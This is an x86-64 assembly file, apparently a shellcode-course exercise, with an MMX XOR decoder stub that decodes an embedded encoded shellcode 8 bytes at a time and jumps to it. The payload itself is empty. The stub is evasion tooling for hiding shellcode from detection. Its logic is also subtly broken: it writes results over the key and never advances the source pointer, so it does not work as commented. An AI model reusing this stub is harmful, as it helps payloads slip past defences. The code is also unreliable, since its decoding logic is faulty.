; Author : Abhinav Thakur
; Email  : compilepeace@gmail.com
;
; Description : This is a mmx xor decoder. This decoder takes in 8 bytes at a time to decode
;				the shellcode unlike other decoders which used 1 byte at a time.
;
; SHELLCODE LENGTH = 
;


global _start


section .text
_start:

	jmp	PushAddress


Decoder:

	pop	rsi				; Address of Decoding byte
	lea	rdi, [rsi + 8]	; RDI points to the encoded shellcode

	xor rcx, rcx		; Zero out RCX
	mov cl, 0x4			; To make sure the loop runs 4 times (i.e. 8 bytes decoded at once for
						;  30 bytes)

	
Decode:
	
	movq mm0, QWORD [rdi]
	movq mm1, QWORD [rsi]
	pxor mm0, mm1
	
	movq QWORD [rsi], mm0
	add	rsi, 0x8
	loop Decode	

	jmp encoded_shellcode


PushAddress:
	
	call Decoder
	decoding_byte:	db	0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA 
	encoded_shellcode:	db	
